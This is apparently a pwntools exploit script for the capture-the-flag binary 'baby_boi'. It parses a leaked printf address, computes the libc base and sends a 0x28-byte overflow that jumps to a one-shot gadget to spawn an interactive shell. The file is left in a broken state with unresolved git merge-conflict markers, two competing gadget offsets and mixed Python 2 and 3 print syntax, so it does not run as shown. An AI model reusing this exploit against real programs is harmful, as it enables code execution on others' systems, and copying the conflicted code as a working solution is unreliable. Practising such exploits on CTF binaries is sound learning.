from pwn import *

# Establish the target
<<<<<<< HEAD
target = process('./baby_boi')
libc = ELF('./libc-2.27.so')
#gdb.attach(target)

print (target.recvuntil("ere I am: "))

# Scan in the infoleak
leak = target.recvline()
print "leak: " + leak
=======
target = process('./baby_boi', env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF('libc-2.27.so')
#gdb.attach(target)

print target.recvuntil("ere I am: ")

# Scan in the infoleak
leak = target.recvline()
>>>>>>> 62e51517054901aa0b7fd1508d70dcb095961589
leak = leak.strip("\n")

base = int(leak, 16) - libc.symbols['printf']

<<<<<<< HEAD
print ("wooo:" + hex(base))

payload = "A"*0x28 + p64(base+0x41602)
# Send the payload
target.sendline(payload)

target.interactive()
=======
print "wooo:" + hex(base)

# Calculate oneshot gadget
oneshot = base + 0x4f322

payload = ""
payload += "0"*0x28         # Offset to oneshot gadget
payload += p64(oneshot)     # Oneshot gadget

# Send the payload
target.sendline(payload)

target.interactive()
>>>>>>> 62e51517054901aa0b7fd1508d70dcb095961589
